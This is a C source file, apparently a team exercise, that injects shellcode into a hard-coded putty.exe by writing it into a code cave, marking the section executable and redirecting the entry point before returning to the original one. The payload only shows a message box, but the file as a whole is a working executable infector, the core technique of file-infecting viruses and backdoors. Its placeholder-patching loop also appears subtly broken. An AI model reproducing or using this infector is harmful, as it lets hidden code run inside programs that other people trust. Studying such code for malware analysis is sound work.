#include <stdio.h>
#include<windows.h>
#define db(x) __asm _emit x
void __declspec(naked) ShellcodeStart()
{
	__asm {
		pushad
		call    routine

		routine :
		pop     ebp
			sub     ebp, offset routine
			push    0                                // MB_OK
			lea     eax, [ebp + szCaption]
			push    eax                              // lpCaption
			lea     eax, [ebp + szText]
			push    eax                              // lpText
			push    0                                // hWnd
			mov     eax, 0xAAAAAAAA
			call    eax                              // MessageBoxA

			popad
			push    0xAAAAAAAA                       // OEP
			ret

			szCaption :
		db('H') db('e') db('l') db('l') db('o') db(' ') db('w') db('o')
			db('r') db('l') db('d') db(0)
			szText :
			db('T') db('e') db('a') db('m') db(' ') db('n') db('u') db('m') db('b')
			db('e') db('r') db(' ') db('4') db(0)
	}
}

void  ShellcodeEnd(void) {}

PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
	return (PIMAGE_DOS_HEADER)file;
}

/*
* returns the PE header
*/
PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
	PIMAGE_DOS_HEADER pidh = GetDosHeader(file);

	return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
}

/*
* returns the file header
*/
PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_FILE_HEADER)&pinh->FileHeader;
}

/*
* returns the optional header
*/
PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_OPTIONAL_HEADER)&pinh->OptionalHeader;
}

/*
* returns the first section's header
* AKA .text or the code section
*/
PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
}

PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
	return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)->FileHeader.NumberOfSections - 1));
}

BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
	return pidh->e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
}

BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
	return pinh->Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
}

int main(int argc, char *argv[])
{
	//	DWORD sizeofshellcode = (DWORD)END_SHELLCODE - (DWORD)shell_code;
	DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
	// Show some info about our shellcode buffer
	printf("Shellcode starts at %p and is %d bytes long", ShellcodeStart, dwShellcodeSize);


	char* szStr = "C://Users/yingtaomj/Desktop/putty.exe";
	WCHAR wszClassName[256];
	memset(wszClassName, 0, sizeof(wszClassName));
	MultiByteToWideChar(CP_ACP, 0, szStr, strlen(szStr) + 1, wszClassName,
		sizeof(wszClassName) / sizeof(wszClassName[0]));

	HANDLE hFile = CreateFile(wszClassName, FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

	LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);


	// check if valid pe file
	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
		fprintf(stderr, "Not a valid PE file\n");
		return 1;
	}

	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

	// get original entry point
	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
		pinh->OptionalHeader.ImageBase;



	// find code cave
	DWORD dwCount = 0;
	DWORD dwPosition = 0;

	for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
		if (*(lpFile + dwPosition) == 0x00) {
			if (dwCount++ == dwShellcodeSize) {
				// backtrack to the beginning of the code cave
				dwPosition -= dwShellcodeSize;
				break;
			}
		}
		else {
			// reset counter if failed to find large enough cave
			dwCount = 0;
		}
	}

	// if failed to find suitable code cave
	if (dwCount == 0 || dwPosition == 0) {
		return 1;
	}
	// dynamically obtain address of function
	char* szStr1 = "user32.dll";
	WCHAR wszClassName1[256];
	memset(wszClassName1, 0, sizeof(wszClassName1));
	MultiByteToWideChar(CP_ACP, 0, szStr1, strlen(szStr1) + 1, wszClassName1,
		sizeof(wszClassName1) / sizeof(wszClassName1[0]));


	HMODULE hModule = LoadLibrary(wszClassName1);

	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

	// create buffer for shellcode
	HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);

	LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);

	// move shellcode to buffer to modify
	memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);


	// modify function address offset
	DWORD dwIncrementor = 0;
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			// insert function's address
			*((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
			FreeLibrary(hModule);
			break;
		}
	}

	// modify OEP address offset
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			// insert OEP
			*((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
			break;
		}
	}

	// copy the shellcode into code cave
	memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
	HeapFree(hHeap, 0, lpHeap);
	HeapDestroy(hHeap);

	// update PE file information
	pish->Misc.VirtualSize += dwShellcodeSize;
	// make section executable
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	// set entry point
	// RVA = file offset + virtual offset - raw offset
	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;

	return 0;

}